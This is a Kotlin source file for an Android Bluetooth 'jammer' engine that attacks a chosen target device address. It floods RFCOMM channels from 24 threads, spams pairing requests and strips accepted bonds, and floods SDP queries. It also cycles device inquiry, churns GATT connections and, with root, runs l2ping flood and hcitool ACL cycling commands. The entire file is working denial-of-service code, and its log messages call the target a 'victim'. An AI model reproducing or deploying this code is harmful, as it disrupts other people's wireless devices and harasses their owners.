// Deprecated platform APIs are still the only option on minSdk 26; their
// replacements require API 33+ branches that this feature cannot take yet.
@file:Suppress("DEPRECATION")

package com.droid.dolphy

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothProfile
import android.bluetooth.BluetoothSocket
import android.content.Context
import kotlin.coroutines.coroutineContext
import kotlinx.coroutines.*
import java.io.File
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicLong

class BluetoothJammerEngine(private val context: Context) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var attackJob: Job? = null

    @Volatile
    private var isRunning = false

    private var targetDevice: BluetoothDevice? = null
    private val openSockets = ConcurrentHashMap.newKeySet<BluetoothSocket>()

    private val rfcommAttempts = AtomicLong(0)
    private val rfcommConnects = AtomicLong(0)
    private val rfcommPackets = AtomicLong(0)
    private val bondEvents = AtomicLong(0)
    private val sdpQueries = AtomicLong(0)
    private val inquiryCycles = AtomicLong(0)
    private val gattAttempts = AtomicLong(0)
    private val gattConnects = AtomicLong(0)

    @Volatile
    private var rootActive = false
    private val rootBursts = AtomicLong(0)
    private val aclCycles = AtomicLong(0)

    private val rfcommUuids = listOf(
        UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"), // SDP
        UUID.fromString("00001105-0000-1000-8000-00805F9B34FB"), // OBEX
        UUID.fromString("0000111F-0000-1000-8000-00805F9B34FB"), // HFP AG
        UUID.fromString("0000110A-0000-1000-8000-00805F9B34FB"), // A2DP Sink
        UUID.fromString("00001108-0000-1000-8000-00805F9B34FB"), // Headset
        UUID.fromString("0000110E-0000-1000-8000-00805F9B34FB"), // AVRCP
        UUID.fromString("0000112F-0000-1000-8000-00805F9B34FB"), // PBAP
    )

    fun startJamming(targetAddress: String, onLog: (String) -> Unit) {
        if (isRunning) return
        isRunning = true

        attackJob = scope.launch {
            post(onLog, "Initializing maximum-power jammer...")
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) {
                post(onLog, "Error: Bluetooth adapter not found")
                isRunning = false
                return@launch
            }

            runCatching { adapter.cancelDiscovery() }
            val device = adapter.getRemoteDevice(targetAddress)
            targetDevice = device

            val name = runCatching { device.name }.getOrNull() ?: "unknown"
            post(onLog, "Target: $targetAddress ($name)")
            post(onLog, "Vectors: RFCOMM x$RFCOMM_THREADS · bond spam · SDP flood · inquiry cycling · GATT churn")

            val vectors = mutableListOf<Job>()
            repeat(RFCOMM_THREADS) { id -> vectors += launch { rfcommFlood(device, id, onLog) } }
            vectors += launch { bondSpam(device, onLog) }
            vectors += launch { sdpFlood(device) }
            vectors += launch { inquiryCycling(adapter) }
            vectors += launch { gattChurn(device) }
            vectors += launch { rootFloodController(device.address, onLog) }
            vectors += launch { statusReporter(onLog) }
            vectors.forEach { it.join() }
        }
    }

    fun stopJamming() {
        isRunning = false
        targetDevice?.let { cancelBondProcessReflect(it) }
        if (rootActive) {
            runCatching {
                ProcessBuilder("su", "-c", "killall l2ping 2>/dev/null; killall hcitool 2>/dev/null").start()
            }
        }
        openSockets.forEach { runCatching { it.close() } }
        openSockets.clear()
        attackJob?.cancel()
        attackJob = null
    }

    fun isRunning(): Boolean = isRunning

    private suspend fun post(onLog: (String) -> Unit, message: String) {
        withContext(Dispatchers.Main) { onLog(message) }
    }

    private suspend fun rfcommFlood(device: BluetoothDevice, threadId: Int, onLog: (String) -> Unit) {
        val random = Random(threadId + 777L)
        while (coroutineContext.isActive && isRunning) {
            rfcommFloodOnce(device, threadId, random, onLog)
            delay(10)
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun rfcommFloodOnce(device: BluetoothDevice, threadId: Int, random: Random, onLog: (String) -> Unit) {
        rfcommAttempts.incrementAndGet()
        val uuid = rfcommUuids[random.nextInt(rfcommUuids.size)]
        val secure = random.nextInt(5) == 0
        var socket: BluetoothSocket? = null
        try {
            socket = if (secure) {
                device.createRfcommSocketToServiceRecord(uuid)
            } else {
                device.createInsecureRfcommSocketToServiceRecord(uuid)
            }
        } catch (e: Exception) {
            return
        }
        val s = socket ?: return
        openSockets.add(s)
        try {
            if (!tryConnect(s)) return
            rfcommConnects.incrementAndGet()
            post(onLog, "RF[$threadId] CONNECTED ${uuidShort(uuid)} ${if (secure) "SEC" else "INSEC"} — flooding channel")
            val out = s.outputStream
            val buffer = ByteArray(2048) { 0xFF.toByte() }
            var packets = 0
            while (isRunning && s.isConnected) {
                out.write(buffer)
                packets++
                rfcommPackets.incrementAndGet()
                if (packets % 128 == 0) yield()
            }
        } catch (e: Exception) {
        } finally {
            openSockets.remove(s)
            runCatching { s.close() }
        }
    }

    private suspend fun tryConnect(socket: BluetoothSocket): Boolean {
        val result = CompletableDeferred<Boolean>()
        val worker = scope.launch(Dispatchers.IO) {
            result.complete(runCatching { socket.connect() }.isSuccess && socket.isConnected)
        }
        val connected = withTimeoutOrNull(CONNECT_BUDGET_MS) { result.await() } ?: false
        if (!connected) {
            worker.cancel()
            runCatching { socket.close() }
        }
        return connected
    }

    @SuppressLint("MissingPermission")
    private suspend fun bondSpam(device: BluetoothDevice, onLog: (String) -> Unit) {
        var lastState = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
        while (coroutineContext.isActive && isRunning) {
            val state = runCatching { device.bondState }.getOrDefault(lastState)
            if (state != lastState) {
                if (state == BluetoothDevice.BOND_BONDING) post(onLog, "BOND: pairing request delivered to victim")
                if (state == BluetoothDevice.BOND_BONDED) post(onLog, "BOND: victim accepted — ripping bond and respawning")
                lastState = state
            }
            when (state) {
                BluetoothDevice.BOND_BONDING -> delay(300)
                BluetoothDevice.BOND_BONDED -> {
                    bondEvents.incrementAndGet()
                    removeBondReflect(device)
                    delay(500)
                }
                else -> {
                    bondEvents.incrementAndGet()
                    runCatching { device.createBond() }
                    val deadline = System.currentTimeMillis() + 2200
                    while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) delay(100)
                    cancelBondProcessReflect(device)
                    delay(500)
                }
            }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun sdpFlood(device: BluetoothDevice) {
        while (coroutineContext.isActive && isRunning) {
            sdpQueries.incrementAndGet()
            runCatching { device.fetchUuidsWithSdp() }
            delay(120)
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun inquiryCycling(adapter: BluetoothAdapter) {
        while (coroutineContext.isActive && isRunning) {
            inquiryCycles.incrementAndGet()
            runCatching { if (!adapter.isDiscovering) adapter.startDiscovery() }
            delay(1400)
            runCatching { adapter.cancelDiscovery() }
            delay(250)
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun gattChurn(device: BluetoothDevice) {
        val callback = object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                if (newState == BluetoothProfile.STATE_CONNECTED) gattConnects.incrementAndGet()
            }
        }
        while (coroutineContext.isActive && isRunning) {
            gattAttempts.incrementAndGet()
            var gatt: BluetoothGatt? = null
            try {
                gatt = device.connectGatt(context, false, callback, BluetoothDevice.TRANSPORT_LE)
                if (gatt != null) delay(1200)
            } catch (e: Exception) {
            } finally {
                runCatching { gatt?.disconnect() }
                runCatching { gatt?.close() }
            }
            delay(250)
        }
    }

    private suspend fun statusReporter(onLog: (String) -> Unit) {
        while (coroutineContext.isActive && isRunning) {
            delay(4000)
            post(
                onLog,
                "STATUS rfcm=${rfcommAttempts.get()} conn=${rfcommConnects.get()} pkt=${rfcommPackets.get()} | " +
                    "bond=${bondEvents.get()} sdp=${sdpQueries.get()} inq=${inquiryCycles.get()} " +
                    "gatt=${gattConnects.get()}/${gattAttempts.get()}" +
                    if (rootActive) " | root l2ping=${rootBursts.get()} acl=${aclCycles.get()}" else "",
            )
        }
    }

    private suspend fun CoroutineScope.rootFloodController(address: String, onLog: (String) -> Unit) {
        val root = withContext(Dispatchers.IO) { isRootAvailable() }
        if (!root) {
            post(onLog, "ROOT: su not available — API vectors only")
            return
        }
        post(onLog, "ROOT: shell acquired")
        val l2ping = withContext(Dispatchers.IO) { findBinary("l2ping") }
        val hcitool = withContext(Dispatchers.IO) { findBinary("hcitool") }
        if (l2ping == null && hcitool == null) {
            post(onLog, "ROOT: l2ping/hcitool not found (need BlueZ tools), raw vectors skipped")
            return
        }
        rootActive = true
        val workers = mutableListOf<Job>()
        if (l2ping != null) {
            post(onLog, "ROOT: l2ping @ $l2ping — raw L2CAP ping flood ON")
            repeat(ROOT_L2PING_WORKERS) { id -> workers += launch { l2pingFlood(l2ping, address, id) } }
        }
        if (hcitool != null) {
            post(onLog, "ROOT: hcitool @ $hcitool — ACL connect/disconnect cycling ON")
            workers += launch { aclCycling(hcitool, address) }
        }
        workers.forEach { it.join() }
        rootActive = false
    }

    private suspend fun l2pingFlood(l2ping: String, address: String, workerId: Int) {
        while (coroutineContext.isActive && isRunning) {
            rootBursts.incrementAndGet()
            val p = runCatching {
                ProcessBuilder("su", "-c", "timeout 2 $l2ping -f -s 600 $address")
                    .redirectErrorStream(true)
                    .start()
            }.getOrNull()
            if (p == null) {
                delay(500)
                continue
            }
            if (!p.waitFor(4, TimeUnit.SECONDS)) {
                runCatching { p.destroyForcibly() }
            }
            delay(20)
        }
    }

    private suspend fun aclCycling(hcitool: String, address: String) {
        while (coroutineContext.isActive && isRunning) {
            aclCycles.incrementAndGet()
            runCatching {
                val p = ProcessBuilder(
                    "su", "-c",
                    "timeout 2 sh -c '$hcitool cc $address; sleep 0.15; $hcitool dc $address'",
                ).redirectErrorStream(true).start()
                if (!p.waitFor(4, TimeUnit.SECONDS)) runCatching { p.destroyForcibly() }
            }
            delay(30)
        }
    }

    private fun isRootAvailable(): Boolean {
        return runCatching {
            val p = ProcessBuilder("su", "-c", "id").redirectErrorStream(true).start()
            if (!p.waitFor(3, TimeUnit.SECONDS)) {
                runCatching { p.destroyForcibly() }
                return false
            }
            p.inputStream.bufferedReader().use { it.readText().contains("uid=0") }
        }.getOrDefault(false)
    }

    private fun findBinary(name: String): String? {
        listOf(
            "/system/xbin/$name",
            "/system/bin/$name",
            "/su/bin/$name",
            "/data/local/tmp/$name",
            "/sbin/$name",
        ).firstOrNull { File(it).exists() }?.let { return it }
        return runCatching {
            val p = ProcessBuilder("su", "-c", "command -v $name").redirectErrorStream(true).start()
            if (!p.waitFor(3, TimeUnit.SECONDS)) {
                runCatching { p.destroyForcibly() }
                return null
            }
            p.inputStream.bufferedReader().use { it.readText().trim().ifEmpty { null } }
        }.getOrNull()
    }

    private fun uuidShort(uuid: UUID): String = uuid.toString().take(8).drop(4)

    private fun removeBondReflect(device: BluetoothDevice) {
        runCatching { device.javaClass.getMethod("removeBond").invoke(device) }
    }

    private fun cancelBondProcessReflect(device: BluetoothDevice) {
        runCatching { device.javaClass.getMethod("cancelBondProcess").invoke(device) }
    }

    companion object {
        private const val RFCOMM_THREADS = 24
        private const val CONNECT_BUDGET_MS = 2200L
        private const val ROOT_L2PING_WORKERS = 2
    }
}
